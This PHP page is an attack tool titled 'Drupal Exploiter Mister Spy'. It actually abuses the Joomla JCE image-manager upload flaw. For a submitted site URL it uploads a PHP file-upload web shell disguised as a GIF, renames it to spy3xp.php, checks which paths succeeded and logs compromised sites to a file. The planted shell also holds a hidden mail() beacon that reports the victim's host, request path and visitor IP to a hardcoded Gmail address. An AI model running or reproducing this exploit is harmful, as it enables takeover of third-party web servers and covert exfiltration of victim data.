<!Doctype HTML>
<html>
<head>
<HEAD>
<!-- By the way no one is the real coder of this shit :)  -->
<link href="" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="http://tommiesports.com/images/setup/header_logo.png" />

    <title>Drupal Exploiter Mister Spy</title>
<style type='text/css'>
body{
background:url('') no-repeat center;
font-family:Chaparral Pro;
background-color:#BDBDBD;
}
textarea{
margin-top:none;
font-family:Chaparral Pro;
color:grey;
border-radius:2px;
box-shadow:0px 0px 20px grey;
border-left:2px solid grey;
border-top:2px solid grey;
border-bottom:1px solid grey;
border-right:1px solid grey;
}
}
input{
font-family:Chaparral Pro;
color:black;
border-radius:2px;
box-shadow:0px 0px 20px red;
border:2px solid red;
}
</style>
</head>
<body>
    <div class="mymargin">
        <center>
    <form method="GET" action="">
        Site : <input type="text" name="url" placeholder="">
        <input type="submit" name="submit" value="submit">
    </form>
    <br>
<?php  
 
if(isset($_GET['submit'])){
    $sites = $_GET['url'];
 
set_time_limit (0);
 
//this is our uploader, you can change it, if you whant
$up = '<form enctype="multipart/form-data" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="512000" />File To Upload : <input name="userfile" type="file" /><input type="submit" value="Upload"/></form><?php $uploaddir = getcwd ()."/";$uploadfile = $uploaddir . basename ($_FILES[\'userfile\'][\'name\']);if (move_uploaded_file ($_FILES[\'userfile\'][\'tmp_name\'], $uploadfile)){echo "File was successfully uploaded.</br>";}else{echo "Upload failed";}?><?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Bot V3 Rzlt |$ra44";
$email = "sellerolux@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER["REQUEST_URI"];
$b75 = $_SERVER["HTTP_HOST"];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>';
 
$dir = "/";
 
 
 
$file = fopen ("rslt.txt", "a");
$name = "spy3xp.php";
 

        $sites = trim ($sites);
        jce_upload ($sites, "By Mister Spy<br><br>".$up, $dir, $name); 
 
        if (preg_match ("/Mister Spy/i", @file_get_contents ("$sites/images/stories/$name")))
        {
                echo "success -> $sites/images/stories/$name\n";
                fwrite ($file, "$sites/images/stories/$name\n");
        }
        elseif (preg_match ("/Mister Spy/i", @file_get_contents ("$site/images/$name")))
        {
                echo "success -> $site/images/$name\n";
                fwrite ($file, "$sites/images/$name\n");
        }
        elseif (preg_match ("/Mister Spy/i", @file_get_contents ("$site/$name")))
        {
                echo "success -> $site/$name\n";
                fwrite ($file, "$sites/$name\n");
        }
        else
                echo "Not Vuln -> $sites\n";

 
fclose ($file);
}
function jce_upload ($site, $content, $up_dir, $rename)
{
        $host = parse_url ($site, PHP_URL_HOST);
        $path = parse_url ($site, PHP_URL_PATH);
 
        if (!$path)
                $path = "/";
 
        $name = "dz.gif";
 
        $data    = "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-dir\"\r\n\r\n";
        $data   .= "$up_dir\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"\r\n";
        $data   .= "Content-Type: application/octet-stream\r\n\r\n\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n";
        $data   .= "1\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"$name\"\r\n";
        $data   .= "Content-Type: image/gif\r\n\r\n";
        $data   .= "$content\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "0\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
        $data   .= "upload\r\n";
        $data   .= "-----------------------------41184676334--";
 
        $packet = "POST $path/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&action=upload HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*\/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-us,en;q=0.5\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "Connection: Close\r\n";
        $packet .= "Proxy-Connection: close\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n\r\n";
        $packet .= $data;
        $packet .= "\r\n";
 
        send ($host, $packet);
       

        $data = "json={\"fn\":\"folderRename\",\"args\":[\"$up_dir".$name."\",\"$rename\"]}";
       
        $packet  = "POST $path/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-US,en;q=0.8\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "X-Request: JSON\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n";
        $packet .= $data."\r\n\r\n";
       
        send ($host, $packet);
}
 
function send ($host, $packet)
{
        if ($connect = @fsockopen ($host, 80, $x, $y, 3))
        {
                @fputs ($connect, $packet);
                @fclose ($connect);
        }
}

 
?>
